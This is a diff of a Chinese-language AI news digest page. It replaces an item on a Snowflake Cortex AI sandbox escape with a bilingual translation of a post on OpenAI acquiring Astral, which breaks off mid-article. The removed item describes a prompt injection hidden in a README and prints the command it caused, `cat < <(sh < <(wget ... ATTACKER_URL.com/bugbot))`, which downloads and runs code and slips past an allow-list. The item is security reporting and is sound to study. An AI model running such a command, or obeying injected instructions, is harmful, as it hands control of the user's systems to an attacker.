@@ -292,40 +292,45 @@
 <div class="container">
   <div class="tabs">
     <button class="tab active" onclick="switchTab('digest')">每日日报</button>
-    <button class="tab" onclick="switchTab('articles')">全部文章 (3)</button>
+    <button class="tab" onclick="switchTab('articles')">全部文章 (5)</button>
   </div>
 
   <!-- 日报 Tab -->
   <div id="tab-digest" class="tab-content active">
-    <div class="topic-chart"><h2>今日主题分布</h2><div class="chart-row"><span class="chart-label">AI安全</span><div class="chart-bar-bg"><div class="chart-bar" style="width:100%;background:#0071e3"></div></div><span class="chart-count">1</span></div>
-<div class="chart-row"><span class="chart-label">沙盒逃逸</span><div class="chart-bar-bg"><div class="chart-bar" style="width:100%;background:#34c759"></div></div><span class="chart-count">1</span></div>
-<div class="chart-row"><span class="chart-label">提示注入</span><div class="chart-bar-bg"><div class="chart-bar" style="width:100%;background:#ff9500"></div></div><span class="chart-count">1</span></div>
-<div class="chart-row"><span class="chart-label">游戏开发</span><div class="chart-bar-bg"><div class="chart-bar" style="width:100%;background:#af52de"></div></div><span class="chart-count">1</span></div>
-<div class="chart-row"><span class="chart-label">AI应用</span><div class="chart-bar-bg"><div class="chart-bar" style="width:100%;background:#ff3b30"></div></div><span class="chart-count">1</span></div>
-<div class="chart-row"><span class="chart-label">项目实战</span><div class="chart-bar-bg"><div class="chart-bar" style="width:100%;background:#5ac8fa"></div></div><span class="chart-count">1</span></div>
-<div class="chart-row"><span class="chart-label">大模型</span><div class="chart-bar-bg"><div class="chart-bar" style="width:100%;background:#ff2d55"></div></div><span class="chart-count">1</span></div>
-<div class="chart-row"><span class="chart-label">AI编程</span><div class="chart-bar-bg"><div class="chart-bar" style="width:100%;background:#ffcc00"></div></div><span class="chart-count">1</span></div></div>
+    <div class="topic-chart"><h2>今日主题分布</h2><div class="chart-row"><span class="chart-label">大模型</span><div class="chart-bar-bg"><div class="chart-bar" style="width:100%;background:#0071e3"></div></div><span class="chart-count">2</span></div>
+<div class="chart-row"><span class="chart-label">OpenAI</span><div class="chart-bar-bg"><div class="chart-bar" style="width:50%;background:#34c759"></div></div><span class="chart-count">1</span></div>
+<div class="chart-row"><span class="chart-label">Python工具</span><div class="chart-bar-bg"><div class="chart-bar" style="width:50%;background:#ff9500"></div></div><span class="chart-count">1</span></div>
+<div class="chart-row"><span class="chart-label">开源生态</span><div class="chart-bar-bg"><div class="chart-bar" style="width:50%;background:#af52de"></div></div><span class="chart-count">1</span></div>
+<div class="chart-row"><span class="chart-label">数据中心</span><div class="chart-bar-bg"><div class="chart-bar" style="width:50%;background:#ff3b30"></div></div><span class="chart-count">1</span></div>
+<div class="chart-row"><span class="chart-label">算力</span><div class="chart-bar-bg"><div class="chart-bar" style="width:50%;background:#5ac8fa"></div></div><span class="chart-count">1</span></div>
+<div class="chart-row"><span class="chart-label">AI</span><div class="chart-bar-bg"><div class="chart-bar" style="width:50%;background:#ff2d55"></div></div><span class="chart-count">1</span></div>
+<div class="chart-row"><span class="chart-label">GPU</span><div class="chart-bar-bg"><div class="chart-bar" style="width:50%;background:#ffcc00"></div></div><span class="chart-count">1</span></div></div>
     <div class="digest-card">
-      <h2>2026-03-18 日报</h2>
-      <p><strong>LLM &amp; AI 工具</strong></p>
+      <h2>2026-03-19 日报</h2>
+      <p><strong>AI 技术日报</strong></p>
+<p><strong>LLM &amp; 开源生态</strong></p>
 <ul>
-<li><strong>OpenAI 发布轻量级模型，Cursor 优化长上下文体验</strong></li>
+<li><strong>OpenAI 收购 Astral，引发 Python 社区控制权担忧</strong></li>
 </ul>
-<p>OpenAI 推出 GPT-5.4 mini 与 nano 模型以提升高容量任务处理效率；Cursor 新增模型自总结上下文功能，解决长会话编程中的上下文窗口限制问题。（来源：TLDR AI）</p>
+<p>OpenAI 宣布收购 Python 工具开发商 Astral（旗下拥有 uv、ruff、ty 等主流开源项目），工程团队将并入 Codex 部门并承诺持续维护开源生态；但社区对关键基础设施的战略控制与&quot;分叉退出&quot;可能性展开深层讨论。（Simon Willison）</p>
 <ul>
-<li><strong>Harmonic 推出自主数学智能体，Mistral/微软/英伟达动态更新</strong></li>
+<li><strong>MiniMax 2.7 以 1/3 成本实现 SOTA 性能并引入自我进化机制</strong></li>
 </ul>
-<p>Harmonic 的 Aristotle Agent 实现 24 小时无人干预的数学定理证明；Mistral 发布企业定制模型平台 Forge，微软重组 Copilot 团队，英伟达恢复对华 H200 芯片供应。（来源：TLDR AI）</p>
-<p><strong>工程与系统设计</strong></p>
+<p>MiniMax 发布新一代开源模型，以 GLM-5 三分之一的成本达到同等性能，首次实现模型自主参与训练迭代的&quot;自我进化&quot;机制。（Latent Space）</p>
+<p><strong>工程与系统优化</strong></p>
 <ul>
-<li><strong>Snowflake Cortex AI 曝出沙盒逃逸漏洞</strong></li>
+<li><strong>基于&quot;LLM in a Flash&quot;方案本地运行 397B Qwen 模型</strong></li>
 </ul>
-<p>安全研究员发现 Snowflake Cortex AI 因未防范 <code>cat</code> 命令中的进程替换攻击而逃出沙箱并执行恶意代码。专家指出依赖命令白名单的防护机制存在固有缺陷，建议采用确定性沙箱彻底隔离 AI 代理操作环境。（来源：Simon Willison）</p>
-<p><strong>产品与增长</strong></p>
+<p>开发者通过 SSD 按需流式加载 MoE 专家权重、2-4 比特量化及减少激活专家数量，在有限内存环境下实现 397B 参数 Qwen 3.5 的 4.36 tokens/秒高效推理。（Simon Willison）</p>
 <ul>
-<li><strong>利用 AI 构建播客主题 RPG 游戏的实战路径</strong></li>
+<li><strong>数据中心算力衡量应以 FLOPS 为核心指标</strong></li>
 </ul>
-<p>设计师 Ben Shih 分享了从零构建宝可梦风格游戏 LennyRPG 的六步工作流程，详述了如何利用 AI 将 300 多期播客文字记录转化为游戏数据，以及在工具选型和关键开发决策中的经验。（来源：Lenny&#x27;s Newsletter）</p>
+<p>分析指出，AI 数据中心规模应以计算能力而非投资额评估：10 万 H100 等效 GPU 算力相当于 500-1000 万部 iPhone 16，而 Meta 规划的 5 吉瓦超大型数据中心可媲美 2-4 亿部 iPhone，凸显 AI 基建的空前规模。（Brian Potter / Construction Physics）</p>
+<p><strong>产品与行业动态</strong></p>
+<ul>
+<li><strong>中国 AI 市场动态：小米/MiniMax 新模型、OpenClaw 普及与 Anthropic 用户调研</strong></li>
+</ul>
+<p>本期关注小米与 MiniMax 发布高性能大模型、中国推动 OpenClaw 全民普及，以及 Anthropic 基于 8.1 万用户的 AI 需求深度调研，同时涵盖 GPT 5.4 与企业级 AI 代理应用进展。（TLDR AI）</p>
     </div>
   </div>
 
@@ -334,418 +339,636 @@
     <div class="article-card">
       <div class="source">Simon Willison</div>
       <div class="title-row">
-        <div class="title">Snowflake Cortex AI 沙箱逃逸并执行恶意软件</div>
-        <span class="tone-pill" style="background:#d1fae5;color:#047857">🧪 实验记录</span>
+        <div class="title">OpenAI收购Astral（uv/ruff/ty）之我见</div>
+        <span class="tone-pill" style="background:#dbeafe;color:#1d4ed8">📊 分析</span>
       </div>
-      <div class="title-en">Snowflake Cortex AI Escapes Sandbox and Executes Malware</div>
-      <div class="tags"><span class="tag">AI安全</span><span class="tag">沙盒逃逸</span><span class="tag">提示注入</span></div>
-      <div class="summary">Snowflake Cortex AI因未能防范cat命令中的进程替换攻击而逃出沙箱并执行恶意代码。安全专家指出依赖命令白名单的防护机制存在固有缺陷，建议采用确定性沙箱来隔离AI代理操作。</div>
+      <div class="title-en">Thoughts on OpenAI acquiring Astral and uv/ruff/ty</div>
+      <div class="tags"><span class="tag">OpenAI</span><span class="tag">Python工具</span><span class="tag">开源生态</span></div>
+      <div class="summary">OpenAI宣布收购Python工具开发商Astral（旗下拥有uv、ruff、ty等主流开源项目），其工程团队将并入Codex部门并承诺持续维护开源生态。文章分析了此次收购对AI编程代理竞争格局的影响，以及社区对关键Python基础设施控制权与战略风险的深层担忧，并探讨了&quot;分叉退出&quot;作为最坏情况备选方案的可能性。</div>
       <div class="quotes-section">
-<div class="quote-block"><div class="quote-en">I&#x27;ve seen allow-lists against command patterns like this in a bunch of different agent tools and I don&#x27;t trust them at all - they feel inherently unreliable to me.</div><div class="quote-zh">我在各种代理工具中见过针对此类命令模式的允许列表，但我完全不信任它们——它们在我看来本质上就不可靠。</div></div>
-<div class="quote-block"><div class="quote-en">I&#x27;d rather treat agent commands as if they could do anything that process itself is allowed to do, hence my interest in deterministic sandboxes that operate outside of the layer of the agent itself.</div><div class="quote-zh">我宁愿将代理命令视为可以执行该进程本身被允许的任何操作，正因如此，我对那些在代理层之外运行的确定性沙箱颇感兴趣。</div></div>
+<div class="quote-block"><div class="quote-en">So is this about the talent or about the product? I expect both, but I know from past experience that a product+talent acquisition can turn into a talent-only acquisition later on.</div><div class="quote-zh">那么这到底是为了人才还是为了产品？我猜测两者皆有，但根据过往经验，产品+人才的收购最终往往会变成单纯的人才收购。</div></div>
+<div class="quote-block"><div class="quote-en">One bad version of this deal would be if OpenAI start using their ownership of uv as leverage in their competition with Anthropic.</div><div class="quote-zh">这笔交易的一种糟糕情况是，OpenAI开始利用他们对uv的所有权作为与Anthropic竞争的筹码。</div></div>
 </div>
-      <div class="translation"><h3 style="margin:24px 0 12px;">Snowflake Cortex AI Escapes Sandbox and Executes Malware</h3>
+      <div class="translation"><h3 style="margin:24px 0 12px;">The official line from OpenAI and Astral</h3>
+<h4 style="margin:20px 0 10px;">OpenAI 与 Astral 的官方说法</h4>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">The attack started when a Cortex user asked the agent to review a GitHub repository that had a prompt injection attack hidden at the bottom of the README.</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">攻击始于一名 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Cortex</strong> 用户要求 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">agent</strong>（智能体）审查一个 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">GitHub</strong> 仓库，该仓库的 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">README</strong> 文件底部隐藏了一个 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">prompt injection</strong>（提示注入）攻击。</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">The Astral team will become part of the <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Codex</strong> team at <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong>.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> 团队将成为 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Codex</strong> 团队的一部分。</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">The attack caused the agent to execute this code:</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">攻击导致该 agent 执行了以下代码：</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Charlie Marsh</strong> has this to say:</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Charlie Marsh</strong> 表示：</p>
 
-<pre style="background:#1d1d1f;color:#f5f5f7;padding:16px;border-radius:8px;overflow-x:auto;font-size:13px;margin:12px 0;"><code>cat < <(sh < <(wget -q0- https://ATTACKER_URL.com/bugbot))</code></pre>
+<blockquote style="border-left:3px solid #c0c0c0;padding:8px 16px;margin:8px 0;background:#f9f9fb;">
+Open source is at the heart of that impact and the heart of that story; it sits at the center of everything we do. In line with our philosophy and <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong>'s own announcement, <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> will continue supporting our open source tools after the deal closes. We'll keep building in the open, alongside our community -- and for the broader Python ecosystem -- just as we have from the start. [...] After joining the <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Codex</strong> team, we'll continue building our open source tools, explore ways they can work more seamlessly with <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Codex</strong>, and expand our reach to think more broadly about the future of software development.
+</blockquote>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">开源是这一切影响力和故事的核心；它是我们所有工作的中心。根据我们的理念以及 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> 自身的声明，交易完成后 OpenAI 将继续支持我们的开源工具。我们将一如既往地与社区一起，在开放中建设，服务于更广泛的 Python 生态系统。[...] 加入 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Codex</strong> 团队后，我们将继续构建开源工具，探索它们与 Codex 更无缝协作的方式，并扩大我们的视野，更广泛地思考软件开发的未来。</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Cortex listed <code>cat</code> commands as safe to run without human approval, without protecting against this form of process substitution that can occur in the body of the command.</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Cortex</strong> 将 <code style="background:#f0f0f5;padding:2px 6px;border-radius:4px;font-size:13px;">cat</code> 命令列为无需人工批准即可安全运行的命令，但并未针对可能出现在命令主体中的这种 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">process substitution</strong>（进程替换）形式提供防护。</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Open source is at the heart of that impact and the heart of that story; it sits at the center of everything we do. In line with our philosophy and <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong>'s own announcement, <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> will continue supporting our open source tools after the deal closes. We'll keep building in the open, alongside our community -- and for the broader Python ecosystem -- just as we have from the start. [...]</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">开源是这一切影响力和故事的核心；它是我们所有工作的中心。根据我们的理念以及 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> 自身的声明，交易完成后 OpenAI 将继续支持我们的开源工具。我们将一如既往地与社区一起，在开放中建设，服务于更广泛的 Python 生态系统。[...]</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">I've seen allow-lists against command patterns like this in a bunch of different agent tools and I don't trust them at all - they feel inherently unreliable to me.</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">我在许多不同的 agent 工具中见过针对此类命令模式的 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">allow-lists</strong>（允许列表），但我完全不信任它们——它们在我看来本质上就不可靠。</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">After joining the <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Codex</strong> team, we'll continue building our open source tools, explore ways they can work more seamlessly with <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Codex</strong>, and expand our reach to think more broadly about the future of software development.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">加入 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Codex</strong> 团队后，我们将继续构建开源工具，探索它们与 Codex 更无缝协作的方式，并扩大我们的视野，更广泛地思考软件开发的未来。</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">I'd rather treat agent commands as if they could do anything that process itself is allowed to do, hence my interest in deterministic sandboxes that operate outside of the layer of the agent itself.</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">我宁愿将 agent 命令视为可以执行该进程本身被允许执行的任何操作，因此我对那些在 agent 本身层级之外运行的确定性 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">sandboxes</strong>（沙箱）产生了兴趣。</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong>'s message has a slightly different focus (highlights mine):</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> 的声明侧重点略有不同（高亮部分为我所加）：</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Via <a href="https://news.ycombinator.com/" style="color:#9a9ea6;">Hacker News</a></div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">来源：<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Hacker News</strong></p>
+<blockquote style="border-left:3px solid #c0c0c0;padding:8px 16px;margin:8px 0;background:#f9f9fb;">
+As part of our developer-first philosophy, after closing <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> plans to support Astral's open source products. By bringing Astral's tooling and engineering expertise to <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong>, we will accelerate our work on <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Codex</strong> and expand what AI can do across the software development lifecycle.
+</blockquote>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">作为我们"开发者优先"理念的一部分，交易完成后 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> 计划支持 Astral 的开源产品。通过将 Astral 的工具和工程专长引入 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong>，我们将加速 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Codex</strong> 的研发工作，并扩展 AI 在整个软件开发生命周期中的应用能力。</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Tags: sandboxing, security, ai, prompt-injection, generative-ai, llms</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">标签：<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">sandboxing</strong>（沙箱技术）、<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">security</strong>（安全）、<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">ai</strong>（人工智能）、<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">prompt-injection</strong>（提示注入）、<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">generative-ai</strong>（生成式 AI）、<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">llms</strong>（大语言模型）</p></div>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">As part of our developer-first philosophy, after closing <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> plans to support Astral's open source products. By bringing Astral's tooling and engineering expertise to <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong>, we will accelerate our work on <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Codex</strong> and expand what AI can do across the software development lifecycle.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">作为我们"开发者优先"理念的一部分，交易完成后 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong> 计划支持 Astral 的开源产品。通过将 Astral 的工具和工程专长引入 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong>，我们将加速 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Codex</strong> 的研发工作，并扩展 AI 在整个软件开发生命周期中的应用能力。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">This is a slightly confusing message. The <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Codex CLI</strong> is a <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Rust</strong> application, and <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> have some of the best <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Rust</strong> engineers in the industry - <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">BurntSushi</strong> alone (<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Rust regex</strong>, <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">ripgrep</strong>, <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">jiff</strong>) may be worth the price of acquisition!</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">这是一个略显矛盾的信号。<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Codex CLI</strong> 是一个 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Rust</strong> 应用，而 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> 拥有业内最顶尖的 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Rust</strong> 工程师——单是 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">BurntSushi</strong>（<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Rust regex</strong>、<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">ripgrep</strong>、<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">jiff</strong> 的作者）可能就值回收购价了！</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">So is this about the talent or about the product? I expect both, but I know from past experience that a product+talent acquisition can turn into a talent-only acquisition later on.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">那么这究竟是为了人才还是为了产品？我猜两者兼有，但根据过往经验，"产品+人才"式的收购（acquisition）日后可能会演变成单纯的"人才收购"（talent-only acquisition）。</p>
+
+<h3 style="margin:24px 0 12px;">uv is the big one</h3>
+<h4 style="margin:20px 0 10px;">uv 是关键</h4>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Of <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong>'s projects the most impactful by far is <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong>. If you're not familiar with it, <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong> is by far the most convincing solution to Python's environment management problems, best illustrated by this classic XKCD:</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">在 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> 的诸多项目中，影响最大的当属 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong>。如果你还不熟悉它，uv 是目前解决 Python 环境管理问题（environment management）最令人信服的方案，这一点通过下面这幅经典的 XKCD 漫画可以最好地说明：</p>
+
+<img src="https://imgs.xkcd.com/comics/python_environment.png" alt="xkcd comic showing a tangled, chaotic flowchart of Python environment paths and installations. Nodes include &quot;PIP&quot;, &quot;EASY_INSTALL&quot;, &quot;$PYTHONPATH&quot;, &quot;ANACONDA PYTHON&quot;, &quot;ANOTHER PIP??&quot;, &quot;HOMEBREW PYTHON (2.7)&quot;, &quot;OS PYTHON&quot;, &quot;HOMEBREW PYTHON (3.6)&quot;, &quot;PYTHON.ORG BINARY (2.6)&quot;, and &quot;(MISC FOLDERS OWNED BY ROOT)&quot; connected by a mess of overlapping arrows. A stick figure with a &quot;?&quot; stands at the top left. Paths at the bottom include &quot;/usr/local/Cellar&quot;, &quot;/usr/local/opt&quot;, &quot;/usr/local/lib/python3.6&quot;, &quot;/usr/local/lib/python2.7&quot;, &quot;/python/&quot;, &quot;/newenv/&quot;, &quot;$PATH&quot;, &quot;????&quot;, and &quot;/(A BUNCH OF PATHS WITH &quot;FRAMEWORKS&quot; IN THEM SOMEWHERE)/&quot;. Caption reads: &quot;MY PYTHON ENVIRONMENT HAS BECOME SO DEGRADED THAT MY LAPTOP HAS BEEN DECLARED A SUPERFUND SITE.&quot;" style="max-width:100%;border-radius:8px;margin:12px 0;"/>
+
+<img src="https://imgs.xkcd.com/comics/python_environment.png" alt="xkcd comic showing a tangled, chaotic flowchart of Python environment paths and installations. Nodes include &quot;PIP&quot;, &quot;EASY_INSTALL&quot;, &quot;$PYTHONPATH&quot;, &quot;ANACONDA PYTHON&quot;, &quot;ANOTHER PIP??&quot;, &quot;HOMEBREW PYTHON (2.7)&quot;, &quot;OS PYTHON&quot;, &quot;HOMEBREW PYTHON (3.6)&quot;, &quot;PYTHON.ORG BINARY (2.6)&quot;, and &quot;(MISC FOLDERS OWNED BY ROOT)&quot; connected by a mess of overlapping arrows. A stick figure with a &quot;?&quot; stands at the top left. Paths at the bottom include &quot;/usr/local/Cellar&quot;, &quot;/usr/local/opt&quot;, &quot;/usr/local/lib/python3.6&quot;, &quot;/usr/local/lib/python2.7&quot;, &quot;/python/&quot;, &quot;/newenv/&quot;, &quot;$PATH&quot;, &quot;????&quot;, and &quot;/(A BUNCH OF PATHS WITH &quot;FRAMEWORKS&quot; IN THEM SOMEWHERE)/&quot;. Caption reads: &quot;MY PYTHON ENVIRONMENT HAS BECOME SO DEGRADED THAT MY LAPTOP HAS BEEN DECLARED A SUPERFUND SITE.&quot;" style="max-width:100%;border-radius:8px;margin:12px 0;"/>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Switch from <code style="background:#f0f0f5;padding:2px 6px;border-radius:4px;font-size:13px;">python</code> to <code style="background:#f0f0f5;padding:2px 6px;border-radius:4px;font-size:13px;">uv run</code> and most of these problems go away. I've been using it extensively for the past couple of years and it's become an essential part of my workflow.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">从 <code style="background:#f0f0f5;padding:2px 6px;border-radius:4px;font-size:13px;">python</code> 切换到 <code style="background:#f0f0f5;padding:2px 6px;border-radius:4px;font-size:13px;">uv run</code>，这些问题大多就迎刃而解了。过去两年来我一直在大量使用它，它已成为我工作流程中不可或缺的一部分。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">I'm not alone in this. According to <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">PyPI Stats</strong> <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong> was downloaded more than 126 million times last month! Since its release in February 2024 - just two years ago - it's become one of the most popular tools for running Python code.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">并非只有我一个人这么想。根据 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">PyPI Stats</strong> 的数据，上个月 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong> 的下载量超过 1.26 亿次！自 2024 年 2 月发布至今——仅仅两年时间——它已成为运行 Python 代码最受欢迎的工具之一。</p>
+
+<h3 style="margin:24px 0 12px;">Ruff and ty</h3>
+<h4 style="margin:20px 0 10px;">Ruff 与 ty</h4>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong>'s two other big projects are <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">ruff</strong> - a Python linter and formatter - and <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">ty</strong> - a fast Python type checker.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Astral</strong> 的另外两大项目是 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">ruff</strong>（Python 代码检查与格式化工具，linter and formatter）和 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">ty</strong>（快速 Python 类型检查器，type checker）。</p>
+
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">These are popular tools that provide a great developer experience but they aren't load-bearing in the same way that <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">uv</strong> is.</div>
